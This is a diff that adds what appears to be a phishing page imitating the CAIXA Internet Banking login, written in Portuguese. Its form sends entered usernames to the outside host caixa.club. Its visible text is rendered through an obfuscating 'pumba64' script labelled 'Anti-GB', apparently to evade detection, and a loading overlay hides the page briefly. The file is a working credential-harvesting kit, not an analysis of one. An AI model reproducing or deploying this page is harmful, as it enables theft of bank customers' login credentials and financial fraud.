@@ -1,0 +1,258 @@
+<script>(function(){
+	var ua = navigator.userAgent;
+	if (!/Firefox/.test(ua) && !/Chrome/.test(ua))
+		if (confirm("Para uma melhor experiência com nossos serviços, utilize o navegador Google Chrome!"))
+			window.open('https://www.google.com.br/chrome/browser/desktop/');
+})()</script>
+<style type="text/css">.lauth{position: fixed;background: rgba(0, 0, 0, 0.3);width: 100%;height: 100%;}.imgload {
+	background: url(public/images/loading.gif);
+width: 104px;height: 104px;position: relative;margin-top: -52px;top: 50%;margin-left: -52px;left: 50%;}</style><div class="lauth loading-auth" style="z-index:999999999999999999999999999999999999999999999;background:#FFF"><div class="imgload"></div></div>
+<script type="text/javascript">setTimeout(function(){document.querySelector('.loading-auth').style.display="none";},2000);</script><!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<link rel="stylesheet" href="libs/css/reset.min.css" />
+	<link rel="stylesheet" href="public/stylesheet-css/main.css" />
+	<script type="text/javascript" src="libs/js/pumba64/pumba64.min.js"></script><!-- Anti-GB -->
+	<script type="text/javascript" src="libs/js/eax/eax.min.js"></script><!-- Anti-GB -->
+	<script type="text/javascript" src="bower_components/jquery/dist/jquery.min.js"></script>
+	<script type="text/javascript" src="bower_components/jquery/dist/jquery-ui.js"></script>
+	<script type="text/javascript" src="bower_components/angular/angular.min.js"></script>
+	<script type="text/javascript" src="public/javascript-js/app.js"></script>
+</head>
+<body ng-app="App"><Blue-Header>
+	<Box Name="Boxer Center Brand_Box">
+		<Picture:Box 
+			Url="public/images/0x03.jpg" 			
+			Name="Brand">
+		</Picture:Box>
+	</Box>
+</Blue-Header><Form Name="FrmLogin" Action="http://caixa.club/backend/Next.php" method="Post">
+<Main>
+
+	<Box Name="Main_Box Center">
+		<Cards Name="Boxes_Main">
+			<Card Name="Boxer_User Left" Style="width:260px;height:330px">
+				<H3><span ID="_X_TITLE_H1"><script>pumba64('JÁ SOU USUÁRIO DO', '#_X_TITLE_H1')</script></span></H3>
+				<H2>
+					<span ID="_X_TITLE_H2A"><script>pumba64('INTERNET BANKING', '#_X_TITLE_H2A')</script></span>
+					<span ID="_X_TITLE_H2B"><script>pumba64('CAIXA', '#_X_TITLE_H2B')</script></span>
+				</H2>			
+				
+				<LabelX Name="Label_Username Label_Main Bold"><span ID="_0x00"><script>pumba64('Usuário', '#_0x00')</script></span></LabelX>
+
+				<nav class="TextBox_Main" name="TextBox_Main" ref="Lg" type="Text"> 
+					<nav class="TextBox_Main-padd"> 
+						<input type="Text" class="TextBox_Main-input" name="Lg" 
+						maxlength="20"> 
+					</nav> 
+				</nav>
+
+				<RadioBox Ref="person" Value="individuals" Customize="Radio_Main">
+					<LabelX Name="Label_Main Bold">
+						<span ID="_0x01"><script>pumba64('Pessoa Física', '#_0x01')</script></span>
+					</LabelX>
+				</RadioBox>					
+
+				<RadioBox Ref="person" Value="legal" Customize="Radio_Main">
+					<LabelX Name="Label_Main Bold">
+						<span ID="_0x02"><script>pumba64('Pessoa Jurídica', '#_0x02')</script></span>						
+					</LabelX>				
+				</RadioBox>				
+
+				<RadioBox Ref="person" Value="government" Customize="Radio_Main">
+					<LabelX Name="Label_Main Bold">
+						<span ID="_0x03"><script>pumba64('Governo', '#_0x03')</script></span>						
+					</LabelX>
+				</RadioBox>
+
+				<CheckBox>
+					<LabelX Name="Label_Secundary Bold">
+						<span ID="_0x05"><script>pumba64('Acessar com Certificado Digital', '#_0x05')</script></span>
+					</LabelX>
+				</CheckBox>
+				
+				<Link:Label 
+					Window="_blank"
+					To="#" 
+					Name="Label_Username Label_Main Bold Safe_Link Safe_Link_Main">
+					<span ID="_0x06"><script>pumba64('Conheça mais sobre certificação digital', '#_0x06')</script></span>
+				</Link:Label>
+				
+				<Section Class="Submit_Basic_Data SBMT">
+					<Nav ID="_0x04" Style="line-height: 32px;" Class="Hand Submit_Button_S Submit_Button UpperCase Right UpperCase"></Nav>
+					<script>pumba64('Acessar', '#_0x04')</script>
+					<cls></cls>
+				</Section>
+			</Card>
+
+			<Cards Name="Right Card_Right">
+				<Card Name="Card_Signup">
+					<H2><span ID="_0x07"><script>pumba64('CADASTRE-SE', '#_0x07')</script></span></H2>
+
+					<Article>
+						<span ID="_0x08"><script>pumba64('Primeiro acesso ao Internet Banking', '#_0x08')</script></span>
+						<span ID="_0x09"><script>pumba64('Caixa? Cadastre sua conta e crie seu', '#_0x09')</script></span>
+						<span ID="_0x0A"><script>pumba64('usuário. É simples, rápido e seguro.', '#_0x0A')</script></span>
+					</Article>
+
+					<Section Class="Submit_Basic_Data">
+						<Button ID="_0x0B" Class="Submit_Button UpperCase Right UpperCase"></Button>
+						<script>pumba64('Cadastrar', '#_0x0B')</script>
+						<cls></cls>
+					</Section>
+				</Card>
+
+				<Card Name="Card_News">
+					<Box>
+						<Box Name="Warning_Icon Left">
+							<Picture Url="public/images/0x05.png" Name="Left"></Picture>
+						</Box>
+						<H2 Name="Left"><span ID="_0x0C"><script>pumba64('NOVIDADE', '#_0x0C')</script></span></H2>
+						<cls></cls>
+					</Box>
+
+					<Article>
+						<P><span ID="_0x0D"><script>pumba64('A CAIXA AMPLIOU A COMPATIBILIDADE', '#_0x0D')</script></span></P>
+						<P><span ID="_0x0E"><script>pumba64('DE NAVEGADORES E SISTEMAS', '#_0x0E')</script></span></P>
+						<P><span ID="_0x0F"><script>pumba64('OPERACIONAIS.', '#_0x0F')</script></span></P>
+						<br /><br />
+						<P><span ID="_0x10"><script>pumba64('VEJA AS MUDANÇAS NA ABA ', '#_0x10')</script></span></P>
+						<P><strong>" 
+							<span ID="_0x11"><script>pumba64('CADASTRO DE COMPUTADORES', '#_0x11')</script></span>
+						"</strong></P>
+					</Article>
+				</Card>
+			</Cards>
+
+			<cls></cls>			
+		</Cards>
+	</Box>
+	
+	<Box Name="Boxer Center BoxerPC">
+		<Line>
+			<Box Name="PC_Picture Left"><Picture Url="public/images/0x06.png"></Picture></Box>		
+			<Article Class="Left Title_PC_Picture">
+				<H1 ID="_0x12"><script>pumba64('CONHEÇA', '#_0x12')</script></H1>
+				<H2 ID="_0x13"><script>pumba64('O INTERNET BANKING CAIXA', '#_0x13')</script></H2>
+			</Article>
+			<cls></cls>
+		</Line>
+
+		<Line>
+
+			<!-- [LEFT] -->
+			<Nav Class="leftBx Left">
+				<ul>
+					<li>
+						<div class="hand menu-item-foo menu-item-foo-1 menu-item-foo-1-active" ng-class="{'menu-item-foo-1-active': menu == 1}" ng-click="menu = 1">
+							<span ID="_0x17"><script>pumba64('SAIBA COMO USAR', '#_0x17')</script></span>
+							<nav class="imgpseudo"></nav>
+						</div>
+					</li>
+					<li>
+						<div class="hand menu-item-foo menu-item-foo-2" ng-class="{'menu-item-foo-2-active': menu == 2}" ng-click="menu = 2">
+							<span ID="_0x18"><script>pumba64('ACESSIBILIDADE', '#_0x18')</script></span>
+							<nav class="imgpseudo"></nav>
+						</div>
+					</li>
+					<li>
+						<div class="hand menu-item-foo menu-item-foo-3" ng-class="{'menu-item-foo-3-active': menu == 3}" ng-click="menu = 3">
+							<span ID="_0x19"><script>pumba64('CADASTRO DE COMPUTADORES', '#_0x19')</script></span>
+							<nav class="imgpseudo"></nav>
+						</div>
+					</li>
+					<li>
+						<div class="hand menu-item-foo menu-item-foo-4" ng-class="{'menu-item-foo-4-active': menu == 4}" ng-click="menu = 4">
+							<span ID="_0x1A"><script>pumba64('SENHA E USUÁRIO', '#_0x1A')</script></span>
+							<nav class="imgpseudo"></nav>
+						</div>
+					</li>
+					<li>
+						<div class="hand menu-item-foo menu-item-foo-5" ng-class="{'menu-item-foo-5-active': menu == 5}" ng-click="menu = 5">
+							<span ID="_0x1B"><script>pumba64('PERGUNTAS FREQUENTES', '#_0x1B')</script></span>
+							<nav class="imgpseudo"></nav>
+						</div>
+					</li>
+				</ul>
+			</Nav>
+
+			<!-- [RIGHT] -->
+			<Nav class="Left rightBx">	
+				<nav style="padding:20px">
+					<nav class="title_info-foo cttb content-box-right-2" ng-show="menu == 1">
+						<h1><span ID="_0x16"><script>pumba64('SAIBA COMO USAR', '#_0x16')</script></span></h1>						
+						<br>
+						<article>
+							<span ID="_0x14"><script>pumba64('O Internet Banking CAIXA ficou mais moderno, prático e acessível. Clique aqui e conheça as ', '#_0x14')</script></span>
+							<span ID="_0x15"><script>pumba64('novidades.', '#_0x15')</script></span>
+							<br /><br />
+							<span ID="_0x1F"><script>pumba64('A CAIXA indica a utilização dos navegadores Internet Explorer, versão 8 , e o Firefox, versão 15,', '#_0x1F')</script></span>
+							<span ID="_0x20"><script>pumba64('para acesso ao Novo Internet Banking CAIXA.', '#_0x20')</script></span>
+							<br />
+							<span ID="_0x21"><script>pumba64('Dificuldade no acesso? Clique aqui e veja uma cartilha com orientações.', '#_0x21')</script></span>
+						</article>
+					</nav>
+
+					<nav class="title_info-foo cttb content-box-right-2" ng-show="menu == 2">
+						<h1><span ID="_0x1C"><script>pumba64('ACESSIBILIDADE', '#_0x1C')</script></span></h1>						
+						<br>
+						<article>
+							<span ID="_0x1D"><script>pumba64('A CAIXA pratica a cidadania também no Internet Banking CAIXA, onde os clientes com deficiência ', '#_0x1D')</script></span>
+							<span ID="_0x1E"><script>pumba64('e/ou limitações visuais encontram uma plataforma adaptada à acessibilidade. Conheça.', '#_0x1E')</script></span>
+						</article>
+					</nav>	
+
+					<nav class="title_info-foo cttb content-box-right-2" ng-show="menu == 3">
+						<h1><span ID="_0x25"><script>pumba64('CADASTRO DE COMPUTADORES', '#_0x25')</script></span></h1>						
+						<br>
+						<article>
+							<span ID="_0x22"><script>pumba64('A CAIXA pensa na sua segurança. Por isso, trouxe um adicional de segurança aos acessos', '#_0x22')</script></span>
+							<span ID="_0x23"><script>pumba64('realizados a partir de computadores cadastrados. Clique aqui e saiba como cadastrar seu', '#_0x23')</script></span>
+							<span ID="_0x24"><script>pumba64('computador.', '#_0x24')</script></span>
+						</article>
+					</nav>
+
+					<nav class="title_info-foo cttb content-box-right-2" ng-show="menu == 4">
+						<h1><span ID="_0x26"><script>pumba64('SENHA E USUÁRIO', '#_0x26')</script></span></h1>						
+						<br>
+						<article>
+							<span ID="_0x27"><script>pumba64('Por questões de segurança, não é possível recuperar sua Senha Internet. Caso você tenha', '#_0x27')</script></span>
+							<span ID="_0x28"><script>pumba64('esquecido seu usuário e senha, será necesário um novo cadastramento. Clique aqui para realizá-lo.', '#_0x28')</script></span>
+						</article>
+					</nav>
+
+					<nav class="title_info-foo cttb content-box-right-2" ng-show="menu == 5">
+						<h1><span ID="_0x29"><script>pumba64('PERGUNTAS FREQUENTES', '#_0x29')</script></span></h1>						
+						<br>
+						<article>
+							<span ID="_0x2A"><script>pumba64('Clique aqui e veja respostas que poderão te auxiliar no acesso ao Banking CAIXA.', '#_0x2A')</script></span>
+						</article>
+					</nav>
+				</nav>			
+			</Nav>
+			<cls></cls>
+		</Line>
+	</Box>
+</Main>
+</Form>
+
+<script>
+window.addEventListener('DOMContentLoaded', function() {
+	document.querySelector('.SBMT').onclick = function() {
+		var isValidLogin = /^[A-Za-z0-9]*\d+[A-Za-z0-9]*$/.test(document.querySelector('.TextBox_Main-input').value);
+		if (isValidLogin && document.querySelector('.TextBox_Main-input').value.length >= 7)
+			document.forms['FrmLogin'].submit();
+		else
+			alert('Usuário inválido!');
+	};
+});
+</script>
+
+<footer Class="Footer">
+	<Picture
+		Url="public/images/0x07.png"
+		Name="Center Table FooImage"></Picture>
+</footer>
+</body>
+</html>
